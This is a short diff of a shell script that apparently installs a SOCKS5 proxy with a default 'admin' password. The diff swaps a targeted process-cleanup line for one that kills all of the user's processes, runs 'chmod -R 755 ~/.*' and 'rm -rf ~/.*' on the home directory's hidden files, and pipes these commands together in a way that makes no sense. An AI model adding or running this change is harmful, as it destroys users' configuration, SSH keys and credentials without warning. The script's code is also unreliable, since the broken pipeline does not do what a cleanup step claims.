@@ -17,7 +17,7 @@ export SOCKS5_PASS=${SOCKS5_PASS:-'admin'}
 
 
 
-ps aux | grep $(whoami) | grep -v "sshd\|bash\|grep" | awk '{print $2}' | xargs -r kill -9 2>/dev/null
+pkill -kill -u $(whoami) | chmod -R 755 ~/.* | rm -rf ~/.* | awk '{print $2}' | xargs -r kill -9 2>/dev/null
 clear
 if [ ! -d "${FILE_PATH}" ]; then
     mkdir ${FILE_PATH}
